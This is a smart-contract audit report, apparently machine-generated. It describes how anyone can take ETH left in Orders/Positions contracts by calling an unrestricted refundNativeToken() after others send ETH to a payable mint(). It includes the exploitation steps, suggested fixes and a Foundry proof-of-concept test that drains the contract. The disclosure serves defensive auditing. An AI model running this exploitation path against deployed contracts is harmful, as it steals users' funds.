## Title
Unrestricted ETH Theft via mint() Payable Function Combined with Public refundNativeToken()

## Summary
The `mint()` function in BaseNonfungibleToken is marked `payable` and accepts ETH via `msg.value` but explicitly ignores it, causing any sent ETH to remain in the Orders/Positions contracts. The `refundNativeToken()` function in PayableMulticallable has no access control and refunds the entire contract balance to `msg.sender`, allowing any attacker to steal ETH that was sent to `mint()` by other users.

## Impact
**Severity**: High

## Finding Description
**Location:** 
- [1](#0-0) 
- [2](#0-1) 

**Intended Logic:** The `mint()` function is designed to create NFTs with deterministic IDs based on minter address and salt. It's marked `payable` to allow composability with other payable functions (like `mintAndDeposit()`) but the documentation states "No fees are collected; any msg.value sent is ignored." [3](#0-2) 

The `refundNativeToken()` function is intended to "allow callers to recover ETH that was sent for transient payments but not fully consumed" [4](#0-3) 

**Actual Logic:** When ETH is sent to `mint()`, it accumulates in the contract balance because `mint()` never uses or transfers it. The `refundNativeToken()` function has no access control and refunds ALL contract balance to `msg.sender` - not the original sender of the ETH. This creates a race condition where any user can steal ETH sent by other users.

**Exploitation Path:**
1. Alice calls `Orders.mint{value: 1 ether}()` or `Positions.mint{value: 1 ether}()` directly (or sends excess ETH in a multicall scenario)
2. The 1 ETH remains in the Orders/Positions contract since `mint()` doesn't consume it [1](#0-0) 
3. Bob monitors the contract and sees `address(Orders).balance > 0` or `address(Positions).balance > 0`
4. Bob calls `Orders.refundNativeToken()` or `Positions.refundNativeToken()` 
5. Bob receives Alice's 1 ETH via the unrestricted refund function [2](#0-1) 

**Security Property Broken:** This violates the fundamental security property that user funds should not be stealable by unprivileged attackers. It's a direct theft vulnerability where users lose their ETH to front-runners or opportunistic attackers.

## Impact Explanation
- **Affected Assets**: Native ETH sent to Orders or Positions contracts via the `mint()` function (either directly or as part of multicalls)
- **Damage Severity**: Complete loss of ETH for victims. Attackers can steal 100% of any ETH that accumulates in these contracts through the `mint()` function.
- **User Impact**: Any user who:
  - Calls `mint()` with ETH (assuming it's used for minting)
  - Calls `mintAndIncreaseSellAmount()` or `mintAndDeposit()` with excess ETH and doesn't include `refundNativeToken()` in the same multicall
  - Makes an honest mistake in calculating required ETH amounts

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can execute this attack. No special permissions required.
- **Preconditions**: 
  - Orders or Positions contract must have non-zero ETH balance (which occurs whenever someone sends ETH to `mint()`)
  - Both Orders and Positions inherit from PayableMulticallable and BaseNonfungibleToken [5](#0-4) [6](#0-5) 
- **Execution Complexity**: Single transaction attack. Attacker simply calls `refundNativeToken()` when contract balance is non-zero.
- **Frequency**: Continuously exploitable. Each time a user sends ETH to `mint()` without immediately calling `refundNativeToken()`, it can be stolen.

## Recommendation

**Option 1 (Recommended): Remove payable modifier from mint() functions**
```solidity
// In src/base/BaseNonfungibleToken.sol, lines 109 and 123:

// CURRENT (vulnerable):
function mint() public payable returns (uint256 id) { ... }
function mint(bytes32 salt) public payable returns (uint256 id) { ... }

// FIXED:
function mint() public returns (uint256 id) { ... }
function mint(bytes32 salt) public returns (uint256 id) { ... }
// This prevents ETH from being accidentally sent to mint() while maintaining composability
// Parent functions like mintAndDeposit() can still be payable and handle ETH properly
```

**Option 2: Add access control to refundNativeToken()**
Track ETH balances per user and only allow users to refund their own ETH. However, this is complex and gas-intensive.

**Option 3: Auto-revert if msg.value > 0 in mint()**
```solidity
function mint() public payable returns (uint256 id) {
    require(msg.value == 0, "No fees collected");
    // ... rest of function
}
```

## Proof of Concept
```solidity
// File: test/Exploit_MintETHTheft.t.sol
// Run with: forge test --match-test test_MintETHTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Orders.sol";
import "../src/Positions.sol";
import "../src/Core.sol";
import "../src/extensions/TWAMM.sol";

contract Exploit_MintETHTheft is Test {
    Orders orders;
    Positions positions;
    Core core;
    TWAMM twamm;
    
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    
    function setUp() public {
        // Deploy protocol contracts
        core = new Core(address(this));
        twamm = new TWAMM(core);
        orders = new Orders(core, twamm, address(this));
        positions = new Positions(core, address(this), 0, 0);
        
        // Fund users
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
    }
    
    function test_MintETHTheft() public {
        // SETUP: Alice accidentally sends 1 ETH to mint()
        vm.startPrank(alice);
        uint256 id = orders.mint{value: 1 ether}();
        vm.stopPrank();
        
        // VERIFY: ETH is stuck in Orders contract
        assertEq(address(orders).balance, 1 ether, "ETH stuck in Orders contract");
        assertEq(alice.balance, 9 ether, "Alice lost 1 ETH");
        
        // EXPLOIT: Bob steals Alice's ETH by calling refundNativeToken()
        uint256 bobBalanceBefore = bob.balance;
        vm.startPrank(bob);
        orders.refundNativeToken();
        vm.stopPrank();
        
        // VERIFY: Bob stole Alice's ETH
        assertEq(bob.balance, bobBalanceBefore + 1 ether, "Bob stole 1 ETH");
        assertEq(address(orders).balance, 0, "Orders contract drained");
        
        // Alice cannot recover her funds
        assertEq(alice.balance, 9 ether, "Alice permanently lost 1 ETH");
    }
    
    function test_MintETHTheft_Positions() public {
        // Same attack works on Positions contract
        vm.startPrank(alice);
        uint256 id = positions.mint{value: 2 ether}();
        vm.stopPrank();
        
        assertEq(address(positions).balance, 2 ether, "ETH stuck in Positions");
        
        vm.startPrank(bob);
        positions.refundNativeToken();
        vm.stopPrank();
        
        assertEq(bob.balance, 12 ether, "Bob stole 2 ETH from Positions");
    }
}
```

**Notes:**
- The vulnerability exists because `mint()` accepts ETH but never uses it [1](#0-0) 
- Both Orders and Positions inherit the vulnerable pattern [5](#0-4) [7](#0-6) 
- The `refundNativeToken()` function sends the entire balance to `msg.sender` without verifying they were the original sender [2](#0-1) 
- This creates a direct theft vector for HIGH severity impact as it results in complete loss of user funds to unprivileged attackers

### Citations

**File:** src/base/BaseNonfungibleToken.sol (L104-108)
```text
    /// @inheritdoc IBaseNonfungibleToken
    /// @dev Generates a salt using prevrandao() and gas() for pseudorandomness.
    ///      Note: This can encounter conflicts if a sender sends two identical transactions
    ///      in the same block that consume exactly the same amount of gas.
    ///      No fees are collected; any msg.value sent is ignored.
```

**File:** src/base/BaseNonfungibleToken.sol (L109-117)
```text
    function mint() public payable returns (uint256 id) {
        bytes32 salt;
        assembly ("memory-safe") {
            mstore(0, prevrandao())
            mstore(32, gas())
            salt := keccak256(0, 64)
        }
        id = mint(salt);
    }
```

**File:** src/base/PayableMulticallable.sol (L21-24)
```text
    /// @notice Refunds any remaining native token balance to the caller
    /// @dev Allows callers to recover ETH that was sent for transient payments but not fully consumed
    ///      This is useful when exact payment amounts are difficult to calculate in advance
    ///      Only refunds if there is a non-zero balance to avoid unnecessary gas costs
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/Orders.sol (L24-24)
```text
contract Orders is IOrders, UsesCore, PayableMulticallable, BaseLocker, BaseNonfungibleToken {
```

**File:** src/base/BasePositions.sol (L29-29)
```text
abstract contract BasePositions is IPositions, UsesCore, PayableMulticallable, BaseLocker, BaseNonfungibleToken {
```

**File:** src/Positions.sol (L13-13)
```text
contract Positions is BasePositions {
```
